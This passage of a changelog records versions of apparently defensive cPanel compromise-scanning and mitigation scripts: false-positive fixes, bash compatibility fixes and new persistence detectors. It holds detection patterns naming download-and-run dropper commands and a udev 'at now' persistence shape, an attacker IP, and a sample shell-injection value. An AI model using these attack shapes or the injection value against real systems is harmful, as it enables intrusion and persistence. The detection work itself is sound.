  → A`, `ioc_pattern_f_* → F`, `ioc_pattern_h_* → H`) routes them correctly
  with no further changes. Verdict math: info/0 → no impact, warning/4-5 →
  SUSPICIOUS (`ioc_review++`), strong/8-10 → COMPROMISED (`ioc_critical++`).

  Implementation is gawk-3.x-clean (2-arg `match` via `~`, char-class
  repetition `[0-7][0-7][0-7]` not `{3}`, ENVIRON-passed needle, no 3-arg
  `match()`). bash 4.1 / set -u / gawk 3.x floor preserved (no `local
  -n`, no negative-substring `${var: -N}`, no `mapfile -d`, no `${var^^}`;
  new `[[ str =~ $regex_var ]]` uses unquoted RHS as required at 4.1).

### Fleet-state context
- **27-host v3-CONFIRMED list** (intake-2026-05-03) was produced under
  v2.7.2 - no Pattern C diag fix, let alone F/H/A. The `imagejax.com` FP
  was caught manually. Re-classify the destruction_iocs in
  `intake-2026-05-03/outputs/records.jsonl` against v2.7.6: hosts whose
  only destructive evidence is a literal-string match in bash_history
  (Pattern C, F, H) or qtox/Sorry-ID strings in a long IR notes file
  (Pattern A) without corroborating filesystem/process/network signal are
  likely-FPs needing responder-checks before customer-notify lists.

## sessionscribe-ioc-scan.sh v2.7.5 — 2026-05-03

### Fixed
- **Pattern C `nuke_trace` false-positive on responder-checked hosts.**
  Field-reported by V. Narayanan and R. Poulose on 2026-05-03 against
  patched-clean cPanel hosts that the sheet flagged "CONFIRMED COMPROMISED"
  due to `ioc_pattern_c_nuclear_x86_referenced`. Root cause: LW responders
  routinely run `history | grep -F "nuclear.x86"` or
  `cat /root/.bash_history | grep nuclear.x86` post-patch as part of an
  IR/QA check. The check command itself lands in `bash_history`, and the
  next ioc-scan run matches the literal string and emits strong → host
  gets escalated to COMPROMISED.

  Pattern C bash_history lines are now classified before emit:
  - **hostile-shape** (download verb `wget`/`curl`/`fetch`/`tftp`,
    pipe-to-shell `| sh|bash|...`, `chmod +x`, `./<bin>`,
    `source/eval/exec/bash/sh` verb adjacent, or binary as the leading
    token) → emits `ioc_pattern_c_nuke_trace` `strong`/10 (unchanged).
    Adds new fields: `hostile_lines`, `diagnostic_lines`,
    `unknown_lines`, `ts_epoch_first` (the first hostile-line epoch from
    the embedded `#<epoch>` markers, useful for kill-chain alignment).
  - **diagnostic-shape only** (line starts with read-only verb
    `history`/`cat`/`grep`/`egrep`/`fgrep`/`zgrep`/`find`/`ls`/`locate`/
    `file`/`ps`/`netstat`/`ss`/`stat`/`tail`/`head`/`less`/`more`/`awk`
    AND has no hostile verb anywhere) → emits new info-tier
    `ioc_pattern_c_nuke_trace_diagnostic` / `ioc_pattern_c_nuclear_x86_diagnostic_only`
    weight 0. Records the classification for the audit trail without
    contributing to the verdict score.
  - **unknown-shape only** (no clear dropper verb but no clear
    diagnostic verb either) → emits warning-tier
    `ioc_pattern_c_nuke_trace_review` / `ioc_pattern_c_nuclear_x86_review`
    weight 4 for manual review.

  All five canned scenarios pass (Vishnu's `host2`, Rino's one-liner,
  mixed real-attacker history, clean history, unknown shape). The
  on-disk binary checks (`PATTERN_C_BIN` sha256 anchor in
  `/tmp/`/`/var/tmp/`/`/dev/shm/`) and C2 host/IP / persistence-path
  checks are unchanged — those primitives are unique to compromise per
  the project's "primitives unique to compromise" doctrine.

  Implementation is gawk-3.x-clean (2-arg match via `~`, char-class
  repetition `[0-7][0-7][0-7]` not `{3}`, ENVIRON-passed needle, no
  3-arg `match()`).

## sessionscribe-ioc-scan.sh v2.7.4 — 2026-05-03

### Added
- **Pattern J2 ExecStart allowlist: `/usr/local/lp/`.** Liquid Web management
  infra (Prometheus exporters under `/usr/local/lp/opt/exporters/<name>/<name>`)
  is RPM-unowned by design but operator-deployed, not attacker-planted.
  Field run on `web02.marathonpress.com` produced 5 false-positive
  `ioc_pattern_j_systemd_unit_candidate` warnings on
  `apache_exporter` / `node_exporter` / `blackbox_exporter` /
  `php-fpm_exporter` / `mysqld_exporter`. Allowlist now includes
  `/usr/local/(bin|sbin|cpanel|lsws|directadmin|lp)`. The `/usr/share/`
  attacker-shape branch is unaffected.

### Fixed
- **Bash 4.1 floor regression: `${path: -25}` negative-substring** at
  `fmt_offense_detail()`. Introduced 2026-05-02 (commit `2122ef0d`).
  Negative-offset substring is bash 4.2+; on the EL6/CL6 floor (bash
  4.1.2) the parser rejects it, breaking the kill-chain renderer the
  moment it formats a path > 50 chars. Replaced with explicit-offset
  form `${path:$((${#path}-25)):25}`. Latent until `--full` mode hit
  a long IOC path.
- **Empty-array deref under `set -u` (4 additional sites).** v2.7.3
  guarded the Pattern J persistence checker; the same class of bug
  remains in `phase_reconcile()` (`DEFENSE_EVENTS[@]` at the
  earliest-offense-vs-latest-defense compare), `write_kill_chain_primitives()`
  (two `DEFENSE_EVENTS[@]` subshell loops, TSV + JSONL writers), and
  `phase_bundle()` (`def_static[@]` when no defense files exist on a
  stock host). All five guarded with the project's
  `(( ${#arr[@]} > 0 ))` length-check idiom.

## sessionscribe-ioc-scan.sh v2.7.3 — 2026-05-03

### Fixed
- **Bash 4.1 floor regression: empty-array deref in
  `check_pattern_j_persistence`.** v2.7.1 introduced six unguarded
  `${arr[@]}` references. On bash 4.1 + `set -u` (CL6/EL6 floor) any
  declared-but-empty array trips `unbound variable`. Field-reported on
  a host with udev rules present but zero shape-matches:
  `bash: line 4823: _hit_shape_strong[@]: unbound variable`. Bash 4.4+
  tolerates this so it slipped past local tests. All six sites guarded
  with the project length-check idiom (matches Pattern A `readme_hits`
  and the eight other guards already in the script).

## sessionscribe-ioc-scan.sh v2.7.2 — 2026-05-03

### Added
- **Bundle retention sweep in `phase_bundle`.** New `prune_old_bundles()`
  helper keeps the 3 newest bundles in `$BUNDLE_DIR_ROOT` (current run +
  the 2 prior) and removes older bundle dirs plus their sibling
  `.upload.tgz`. Operator-renamed entries that don't carry the TS_ISO-Z
  prefix are left alone. Retention configurable via `$BUNDLE_RETENTION`
  env (0 = disable). Default 3 chosen because uploads ride off-host to
  intake and the on-host copy is operator-recovery scratch — unbounded
  accumulation has been the dominant disk-pressure signal on busy fleet
  hosts that run `--full` regularly. Pruned-bundle count and MiB freed
  emit as `bundle_pruned` info signal.

### Fixed
- Top-of-file v-header drift (carried over from v2.7.1 doc fix): header
  comment now matches `VERSION` at parse time.

## sessionscribe-ioc-scan.sh v2.7.1 — 2026-05-03

### Added
- **Pattern J — init-facility persistence detection.** New IOC class
  alongside the existing A-I dossier patterns. Two sub-detectors inside
  `check_destruction_iocs`:
  - **J1 (udev)** — walks `/etc/udev/rules.d/` and `/run/udev/rules.d/`.
    Strong tier requires the `RUN+="...sh -c '... | at now'"` shape
    (dossier-observed; the pipe-to-`at now` form is vanishingly rare in
    benign udev automation). Warning tier covers `nohup`/`setsid`/`disown`
    backgrounded shell-outs. Both gates AND with non-RPM-ownership.
  - **J2 (systemd)** — walks `/etc/systemd/system/*.service` only
    (operator-customizable tree; `/usr/lib/systemd/system/` is RPM
    territory and is intentionally skipped). Strong tier requires the
    conjunction: ExecStart inside `/usr/share/` + Description shadows a
    known systemd/cPanel service name + unit and binary not RPM-owned +
    mtime within 90 days. Otherwise warning. Allowlist for legit
    ExecStart roots includes `/usr/local/cpanel/`, `/usr/local/lsws/`,
    `/opt/`, `/var/cpanel/`, `/var/lib/dovecot/`, `/var/lib/mysql/` so
    a stock control-panel host doesn't FP.
  - Snapshot-aware: when `--root DIR` is set, walks `${DIR}/etc/...`
    and demotes severity to `info` with `degraded_confidence_snapshot=1`
    (no live rpmdb to cross-check ownership).
  - RPM ownership probe via new helper `is_rpm_owned()` and bulk-mode
    `bulk_rpm_owned_filter()` (one rpmdb open for N paths instead of N
    individual rpm calls). Falls back to `dpkg -S` on debian-ish hosts;
    if neither tool is present, severity downgrades automatically.
  - Pattern letter `J` wired into `ioc_key_to_pattern()`, `PATTERN_ORDER`,
    and `PATTERN_LABEL`. `[I]` and `[G]` labels relabeled to
    `persistence (...)` for symmetry with `[J]` and `[D]`.
- **Mitigate-quarantine secondary read** in `check_sessions`. On hosts
  where `sessionscribe-mitigate.sh` ran, forged sessions are moved out
  of `/var/cpanel/sessions/raw/` and into the quarantine tree at
  `$MITIGATE_BACKUP_ROOT/<RUN>/quarantined-sessions/raw/`. The live walk
  saw an empty raw/ on those hosts and produced `host_verdict=CLEAN` on
  demonstrably compromised systems. New `check_quarantined_sessions()`
  function walks the quarantine, reads each `<sname>.info` sidecar with
  a data-only key=value parser (no eval), and emits one synthetic
  `ioc_quarantined_session_<sname>` warning-tier signal per file with:
  `original_path`, `quarantine_run_dir`, `quarantine_ts`, original
  `mtime_epoch` (from sidecar — attacker write-time, not our cp time),
  `reasons_ioc` (the IOC pattern letters that fired the quarantine),
  `sha256`. Quarantined emits route to Pattern X via dedicated
  `(ioc_quarantined_session_*) echo X` branch in `ioc_key_to_pattern`.
  Cap of 200 sessions analyzed per scan, oldest-skip beyond. Sidecar
  fallback when missing (mitigate v0.4.x predates sidecars): use file
  mtime + `low_confidence_no_sidecar=1` flag, never crash.
- **`45.92.1.188` added to `ATTACKER_IPS`** (rev5; Pattern J operator).

### Changed
- VERSION 2.6.1 → 2.7.1 (additive features, new IOC class, schema bump).
- `_schema_changes` meta record bumped to `schema_version=4` with a v4
  entry describing the new emit fields (`pattern_j`,
  `quarantined_session_emit`, `quarantine_run_dir`, `original_path`,
  `reasons_ioc`, `low_confidence_no_sidecar`,
  `degraded_confidence_snapshot`).
- `check_destruction_iocs` snapshot-mode early-return now runs Pattern J
  (degraded confidence) before returning, instead of skipping
  destruction probes wholesale. Matches the user expectation that
  `--root` against an offline snapshot can still surface persistence.
- `check_sessions` early-return path (when `/var/cpanel/sessions` is
  missing) now runs the quarantine secondary first — previously, hosts
  without a live sessions dir reported `CLEAN` even when the quarantine
  contained evidence of past compromise.

### Notes
- Pattern J detection is RPM-ownership-anchored to bound FP rate. Hosts
  running heavy site-tooling that drops non-RPM-owned udev rules or
  systemd units may emit `warning`-tier J signals; the `strong` tier
  requires the attacker-specific shape conjunction so should be
  near-zero-FP on typical fleet hosts.
- For fleet aggregation: query `signals[].id == "ioc_pattern_j_*"` for
  J emits and `signals[].id ^= "ioc_quarantined_session_"` for the
  quarantine secondary's contribution. The kill-chain renderer slots J
  alongside G/I as co-stage persistence (post-RCE).

## sessionscribe-ioc-scan.sh v2.6.1 — 2026-05-02

### Fixed
- **`manifest.txt` and `kill-chain.jsonl` meta record now carry real values.**
  `CPANEL_NORM`, `PRIMARY_IP`, `OS_PRETTY`, `LP_UID`, and their JSON-escaped
  twins were declared empty at top-level with comments saying "set by
  banner()" — but `banner()` only printed. Result: every bundle since the
  meta record was added had empty `cpanel_version` / `primary_ip` / `os` /
  `uid`. Fleet aggregation that read those fields silently lost ~100% of
  host context. Added `collect_host_meta()` (data-only key=value parser
  for `/etc/os-release` with double- and single-quote stripping; same
  cpanel-V resolution chain as `check_version()`; `ip route get` →
  `hostname -I` for primary IP; env-var override for `LP_UID`).
- **`PATCHED_BUILDS_CPANEL` was declared empty and never populated.**
  `phase_defense`'s patched-build for-loop walked a 0-element array on
  every host, so no host could ever reach the PATCHED branch via the
  build-equality check. Now populated from `PATCHED_TIERS_KEYS` /
  `PATCHED_TIERS_VALS` at startup, producing strings of shape
  `11.<tier>.0.<build>` that match `CPANEL_NORM`.
- **`PATCHED_BUILD_WPSQUARED` was declared empty and never assigned.**
  WP Squared hosts (build 136.1.7) could never match the equality test.
  Now set to `"11.136.1.7"` per the source comment.
- **`UNPATCHED_TIERS` was a scalar string iterated as an array.**
  `for t in "${UNPATCHED_TIERS[@]}"` over `"112 114 116 120 122 128"`
  iterated ONCE with `t` set to the entire string, so `[[ "$tier" == "$t" ]]`
  never matched. Every UNPATCHABLE-tier host (112/114/116/120/122/128)
  was misclassified as UNPATCHED in `phase_defense`. Converted to an
  array; both `phase_defense` and `check_version` now use the same
  substring-match idiom against the derived `UNPATCHED_TIERS_STR`.
- **`LP_UID` env-var override was clobbered.** `LP_UID="${LP_UID:-}"`
  inside `collect_host_meta` came AFTER the top-level `LP_UID=""` had
  already wiped the inherited env. Changed top-level to
  `: "${LP_UID:=}"` so `LP_UID=nx-prod-12 ./sessionscribe-ioc-scan ...`
  at fleet dispatch survives the initialization.
- **`/etc/os-release` parser was shell-injection-vulnerable.** Original
  `eval "$(awk ... print "VAR="$2)"` interpolated raw values; a
  `PRETTY_NAME="end"; touch /tmp/x; X="rest"` would execute the `touch`.
  Trust boundary holds today (root-owned file), but a snapshot/offline
  run could consume an attacker-influenced copy. Replaced with a
  data-only `while IFS='=' read -r _k _v; do ... done` parser.
- **`check_version()` and `collect_host_meta()` regex paths diverged.**
  `check_version` was unanchored (`([0-9]{2,3})\.0...`) — input like
  `"1234.0 (build 5)"` matched the trailing `234` via leftmost-not-
  anchored bash regex. `collect_host_meta` was anchored. Both now use
  `^[[:space:]]*(...)` and the `cpanel -V` read uses the same
  `2>/dev/null | head -1 | tr -d '\r'` form so they produce identical
  output on stderr-noisy hosts.

### Removed
- Dead `to_epoch()` and `extract_log_ts()` helpers (zero callers).
- Orphan globals: `BUNDLE_TGZ`, `ENV_STRONG`, `ENV_FIXED`,
  `ENV_INCONCLUSIVE`, `ENV_IOC_CRITICAL`, `ENV_IOC_REVIEW`. The latter
  five were assigned by `read_envelope_meta`'s summary-block parser but
  never read; the parser block was deleted with them.
- `HOSTNAME_J` global — duplicated `HOSTNAME_JSON` (same json_esc'd
  hostname, different consumers). Consolidated to `HOSTNAME_JSON`.

### Changed
- VERSION 2.5.0 → 2.6.1. Skipping 2.6.0 because the same fix landed on
  the engineering branch under that label before the slop-cleanup
  cycle expanded scope; 2.6.1 is the first published release.

### Notes
- The `version_detect` signal in `signals[]` was already populated
  correctly pre-fix (it's emitted from local `tier`/`build` parsing
  inside `check_version`, independent of the broken globals). For fleet
  aggregation that needs cpanel version, query
  `signals[].id == "version_detect" → version` as the authoritative
  source. The `meta` record's `cpanel_version` field is now also
  reliable as of v2.6.1.

## sessionscribe-ioc-scan.sh v2.5.0 — 2026-05-02

### Added
- **`--chain-on-all` / `--chain-always` flag** — runs the forensic
  chain (defense + offense + reconcile + kill-chain + bundle) for
  EVERY host scanned, regardless of `host_verdict`. Overrides the
  default CLEAN-skip and overrides `--chain-on-critical`. Pair with
  `--upload` to ship every bundle to intake. Use cases:
  - Fleet baseline collection (snapshot of every host's defense + IOC
    state for trend analysis).
  - Post-incident "are we definitely clean?" verification (CLEAN
    verdict + clean kill-chain artifact = strong evidence).
  - Threat-intel data-lake construction (every scan contributes a
    bundle for cross-fleet pattern mining).
- Forensic-gate priority documented in main flow (highest first):
  `--chain-on-all` > `--chain-on-critical` > default `--full`.
  When both `--chain-on-all` and `--chain-on-critical` are set,
  `--chain-on-all` wins (operator's explicit "I want everything"
  override).
- `forensic_chain_on_all` info signal emitted when the override
  fires, so envelope consumers can attribute the bundle to an
  unconditional run vs. a verdict-gated one.
- `forensic_skipped_clean` note now hints at `--chain-on-all` as
  the explicit override path, so operators discover the flag from
  the existing skip message.

### Changed
- VERSION 2.4.1 → 2.5.0 (additive flag = minor bump).

### Notes
- `--chain-on-all` does NOT change verdict semantics — host_verdict,
  exit_code, and score are computed the same way regardless of which
  gate decides whether forensic phases run. The flag only controls
  whether the kill-chain artifact + bundle get produced.

## sessionscribe-ioc-scan.sh v2.4.1 — 2026-05-02

### Added
- **Visual kill-chain rendering for v2.4.0 advisory entries.** The
  pre-compromise gate keys (`ioc_pattern_e_websocket_shell_hits_pre_compromise`,
  `ioc_pattern_e_websocket_shell_hits_orphan`,
  `ioc_attacker_ip_2xx_on_cpsess_pre_compromise`) were filtered out of
  `read_iocs_from_envelope` in v2.4.0 (severity ∈ {strong, warning}
  filter excluded advisory), so they were invisible in the kill-chain
  timeline. v2.4.1 admits them via a narrow allow-list (specific keys,
  not blanket advisory-pass) so operators see the full forensic
  picture. They render in dedicated zones with cyan styling so they
  remain clearly distinct from the actual attack chronology.
- New verdict types in `phase_reconcile`:
  - `ADVISORY-PRE-COMPROMISE` — for `*_pre_compromise` keys (no CRLF
    anchor or event predates first CRLF chain).
  - `ADVISORY-ORPHAN` — for `*_orphan` keys (post-CRLF but >7 days
    from nearest 2xx_on_cpsess).
  Both short-circuit the standard PRE/POST defense comparison and
  do NOT increment `N_PRE` / `N_POST` (advisory rows are context, not
  attack-chain events).
- New zone IDs in `render_kill_chain`: `adv_pre` (header label
  "ADVISORY (PRE-COMPROMISE CONTEXT)") and `adv_orphan` ("ADVISORY
  (EXPLOITATION-DETACHED)"), both rendered in cyan + bold via the
  existing zone-header machinery so they appear as labeled bands in
  the timeline above/around the real attack zones.
- `render_offense_row` colors `ADVISORY-*` verdicts in cyan to match
  their zone header — visible in the timeline but visually distinct
  from the red/green/yellow attack-chain palette.
- New `counters` line breakout: `advisory=N` shows the count of
  advisory rows; the existing `iocs=N` field now shows attack-chain
  events only (`#OFFENSE_EVENTS - n_advisory`) so operators can read
  it directly without mental subtraction.

### Changed
- `kill-chain.tsv` and `kill-chain.jsonl` will now carry rows with
  verdict values `ADVISORY-PRE-COMPROMISE` / `ADVISORY-ORPHAN` for
  hosts where the v2.4.0 gate demoted Pattern E or 2xx_on_cpsess.
  Aggregator-side: ss-aggregate.py should pattern-match `ADVISORY-*`
  to bucket these separately from the real PRE/POST/UNDEFENDED
  attack-chain rows.
- VERSION 2.4.0 → 2.4.1.

### Notes
- Defense-bypass risk surface — none. Advisory severity is still
  invisible to `ioc_critical` / `ioc_review` aggregation; admitting
  them into the kill-chain renderer does NOT change `host_verdict`,
  exit code, or score. The new `iocs=N` counter in the kill-chain
  block now excludes advisory rows so it matches `#REASONS` accurately.

## sessionscribe-ioc-scan.sh v2.4.0 — 2026-05-02

### Added
- **Pre-compromise temporal gate** for two second-order signals that were
  artificially skewing cluster-onset timeline metrics
  (`ioc_pattern_e_websocket_shell_hits` and
  `ioc_attacker_ip_2xx_on_cpsess`). Both are post-RCE / token-consumption
  evidence — they require a first-order CVE-2026-41940 exploitation
  primitive (`ioc_cve_2026_41940_crlf_access_chain`) as compromise
  anchor. Without one, the hits are most likely shared-infra
  coincidence, recycled-token noise, or pre-disclosure recon (the
  testdev.halcyonplatinum.com pattern: Pattern E 2025-11-24,
  2xx_on_cpsess 2026-03-26, both predating the actual CRLF chain at
  2026-04-30 by months).
- New advisory keys (weight=0; do NOT escalate `host_verdict`; surface
  in ADVISORIES + signals[] for fleet-aggregator visibility):
  - `ioc_attacker_ip_2xx_on_cpsess_pre_compromise` — fired when CRLF
    chain is absent on the host, OR when 2xx_on_cpsess `ts_first`
    PREDATES the first CRLF chain epoch.
  - `ioc_pattern_e_websocket_shell_hits_pre_compromise` — same gate
    against CRLF chain.
  - `ioc_pattern_e_websocket_shell_hits_orphan` — fired when Pattern E
    passes the CRLF gate but is more than `PATTERN_E_2XX_PROXIMITY_SEC`
    (default 7 days) away from the nearest successful token-use event
    (`ioc_attacker_ip_2xx_on_cpsess` first epoch). Operator opened
    shell but never re-entered via cpsess token in the same session
    window — exploitation-detached.
- Each emit now carries `crlf_first_epoch` (and Pattern E adds
  `twoxx_first_epoch` + `proximity_sec`) so downstream consumers
  (ss-aggregate.py, kill-chain readers) have full provenance for the
  gate decision without re-deriving it from the run.
- New constant `PATTERN_E_2XX_PROXIMITY_SEC=604800` (7 days). New
  globals `LOGS_CRLF_CHAIN_FIRST_EPOCH`, `LOGS_2XX_CPSESS_FIRST_EPOCH`
  carry inter-check state (initialized to 0 so `--replay` mode and
  empty-log paths cannot trip `set -u`).
- `ioc_key_to_pattern()` explicit case clauses route the three new keys
  to `init` (not part of the kill-chain pattern alphabet) before the
  `ioc_pattern_e_*` and `ioc_attacker_ip*` globs would catch them.

### Changed
- `check_logs` now calls `check_crlf_access_primitive` BEFORE
  `check_attacker_ips` (was the reverse). Both functions read the
  access_log independently, so the reorder is observation-equivalent
  for hosts where the CRLF chain does not fire; for hosts where it
  does, the CRLF first epoch is now available as the temporal anchor
  for the 2xx_on_cpsess gate at emit time. Pattern E's gate runs in
  `check_destruction_iocs` which already executes after `check_logs`,
  so no reorder is needed there.
- VERSION 2.3.0 → 2.4.0.

### Notes
- The forensic kill-chain reconstruction filters by
  `severity ∈ {strong, warning}` (per `read_iocs_from_envelope`), so
  the new advisory entries are correctly EXCLUDED from
  `kill-chain.jsonl` / `kill-chain.tsv` — pre-compromise events no
  longer pollute the post-hoc attack timeline. They remain in the
  envelope's `signals[]` array for ss-aggregate.py to compute
  pre-compromise threat-intel stats.
- Aggregator-side follow-up: `ss-aggregate.py` should treat
  `_pre_compromise` and `_orphan` keys as their own buckets (not
  collapsed into the strong-tier siblings) so cluster-onset / first-X
  / threat-actor-bucketing analyses see clean post-compromise data.

## sessionscribe-ioc-scan.sh v2.3.0 — 2026-05-02

### Added
- **Gap 10: `session_mtime_vs_ctime_anomaly` IOC** — flags session files
  whose mtime diverges from ctime by `>= SESSION_MTIME_CTIME_THRESHOLD_SEC`
  (default 600s). cpsrvd's session writer sets both timestamps atomically,
  so legitimate sessions have `mtime == ctime` to the second; divergence
  indicates the mtime was modified separately (`touch -d` backdating, or
  `cp -p` / `tar xp` / `rsync -t` restore artifact). Severity is
  `advisory` (weight 0): does NOT escalate `host_verdict` — surfaces in
  ADVISORIES for operator awareness only. Closes the
  `testdev.halcyonplatinum.com` pre-disclosure-outlier investigation:
  the 2025-11-25 first-X anchor that placed cluster-onset 4.5 months
  before the campaign was a session whose mtime was 5+ months earlier
  than ctime; downstream cluster-onset analysis (ss-aggregate.py q5/q8)
  can now discount mtime when this IOC fires.
- `emit_session()` always includes `file_ctime` (ISO-8601 UTC) and
  `mtime_ctime_delta_sec` (signed seconds). Non-breaking schema addition;
  consumers handle missing fields naturally.
- New `analyze_session()` globals `SF_FILE_CTIME`, `SF_FILE_CTIME_ISO`,
  `SF_MTIME_CTIME_DELTA`. `stat -c '%Y %Z'` is a single subprocess call
  (replaces the prior `stat -c %Y` so the new ctime adds zero new
  subprocesses per session).
- Section-level summary `session_mtime_anomaly_summary` (advisory) emits
  when the per-host count is non-zero. The count lets fleet aggregators
  distinguish single-session forgery from fleet-wide restore artifacts
  (mass `cp -p` produces dozens of mtime != ctime sessions).
- `no_session_iocs` all-clear is now gated on `mtime_anomalies == 0` so
  a host with quietly-backdated sessions but no other signals does not
  falsely assert no_session_iocs.

### Changed
- VERSION 2.2.0 → 2.3.0.

## sessionscribe-mitigate.sh v0.5.1 — 2026-05-02

### Fixed
- **EL6 floor regression** — line 470 used `declare -ga SIGNALS_JSON=()`
  which requires bash 4.2+ (the `-g` flag does not exist in bash 4.1.2).
  On CloudLinux 6 / EL6 hosts the script would fail at parse / declare
  time before any phase ran. `SIGNALS_JSON` is declared at top-level
  scope alongside `P_VERDICT`, `P_DETAIL`, `P_NOTES`, `PHASE_ORDER_RUN`
  (lines 464–467, all `declare -A` / `declare -a` without `-g`), so the
  `-g` was redundant. Replaced with `declare -a` to match the rest of
  the top-level declarations and restore bash 4.1.2 compatibility.
  Verified via `bash -n` + `shellcheck -S error` + `--help` smoke test.

### Changed
- VERSION 0.5.0 → 0.5.1.

## sessionscribe-mitigate.sh v0.5.0 — 2026-05-02

### Added
- New `phase_snapshot` runs FIRST in the phase order; captures the
  pre-mitigation state of `/var/cpanel/users/`, `accounting.log[.*]`,
  `audit.log[.*]`, `cpanel.config`, and `sessions/{raw,preauth,cache}/`
  to `<BACKUP_DIR>/pre-mitigate-state.tgz` BEFORE any mutating phase
  perturbs it. Closes Gap 8 from the v3/v4 IOC-scan recommendations:
  rogue WHM API tokens / accounts / accounting-log persistence are no
  longer destroyed by the gap between mitigate-time and forensic-bundle
  capture time.
- `whmapi1 get_tweaksetting` output for `proxysubdomains` and
  `proxysubdomainsfornewaccounts` is captured into
  `pre-mitigate-tweaksettings.txt` next to the tarball, closing the
  per-file backup gap that previously left `phase_proxysub` mutations
  with no undo path.
- `.info` sidecar with sha256 of the tarball, byte size, tier1/tier2
  inventory, sessions-included flag, and tar return code.
- New CLI flags: `--no-snapshot` opt-out, `--max-snapshot-mb MB`
  (default 500) caps the session-corpus tier; tier-1 always captured.
- `ioc-scan`'s `phase_bundle` already includes the entire
  `MITIGATE_BACKUP_ROOT` in `defense-state.tgz`, so the new artifact
  rides into forensic bundles without an ioc-scan-side change.

### Changed
- Phase order now begins with `snapshot`; existing operators relying on
  the prior bare `--apply` behavior should add `--no-snapshot` if they
  want the v0.4.x behavior.

## sessionscribe-mitigate.sh v0.4.2 — 2026-05-02

### Added
- `phase_sessions` IOC-D2: single-line `pass=` on a badpass session with
  no auth markers (well-formed, `pass_count == 1`, not stranded). Closes
  parity gap with the cPanel reference IOC-5. ATTEMPT-class.
- `phase_sessions` standalone IOC-2: `tfa_verified=1` outside known-good
  origins (`handle_form_login`, `create_user_session`,
  `handle_auth_transfer`), non-badpass. Closes parity gap with the
  cPanel reference IOC-2. ATTEMPT-class.
- `tests/sessions/` fixtures + `tests/run-session-tests.sh` harness
  that extracts the awk block from the production script and asserts
  reasons-CSV per fixture. Six cases: two positive, four negative.

### Changed
- `phase_sessions` dry-run output now distinguishes
  `forged session: <path>` (any of A/B/C/D/E/E2/F/H/I fired — confirmed
  forgery) from `attempt session: <path>` (only D2 / 2 fired — session-
  level attempt residue without confirmed forgery markers). Quarantine
  treatment under `--apply` is identical for both classes — the split
  is display-only so operators can read class without parsing reason
  letters.
- `tfa_verified=1` awk anchor tightened to `/^tfa_verified=1$/` (was
  `/^tfa_verified=1/`) so unrelated values like `tfa_verified=10` cannot
  match. Defensive — cpsrvd writes the field as a strict boolean.

### Notes
- Reasons-CSV literal append order in code: A,B-cand,C,D,E,E2,F,H,I,D2,2.
  D2 + 2 are appended after IOC-I to keep the existing prefix stable for
  any downstream consumer that pattern-matches on `reasons:`.
- gawk 3.1.x compat: no `{n}` quantifiers, no 3-arg `match()`, no
  `gensub`/`patsplit`. Verified via the per-release gate.
- has_kg known-good origin list (handle_form_login / create_user_session
  / handle_auth_transfer) was audited against the v0.4.2 patched-tier
  floor: `Cpanel/Security/Authn/TwoFactorAuth/Verify.pm:122` and
  `Cpanel/Server.pm:2295`. Bumping the floor in the future requires
  re-auditing those source files for new tfa-minting code paths.
